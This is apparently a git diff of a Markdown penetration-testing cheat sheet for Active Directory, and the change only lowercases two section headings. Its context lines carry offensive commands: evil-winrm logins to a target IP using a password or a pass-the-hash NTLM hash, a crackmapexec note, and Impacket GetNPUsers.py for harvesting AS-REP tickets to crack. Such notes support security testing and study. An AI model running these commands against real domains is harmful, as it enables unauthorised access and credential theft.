@@ -76,7 +76,7 @@ cat ldapdump | awk '{print s$1}' | sort | uniq -c| sort -nr | grep :
 ```
 If you find anything interessting search for it in the dump
 
-## Gaining access
+## gaining access
 check
 with the latsest version of crackmapexec use 'cme' instead of 'crackmapexec'
 ```
@@ -89,7 +89,7 @@ ruby evil-winrm.rb -i 10.10.1.2 -u username -p password
 ruby evil-winrm.rb -i 10.10.1.2 -u username -H ntlmhash
 
 ```
-## Impacket
+## impacket
 ### GetNPUsers.py
 Queries target domain for users with 'Do not require Kerberos pre auth' set and export the TGTs for cracking
 ```
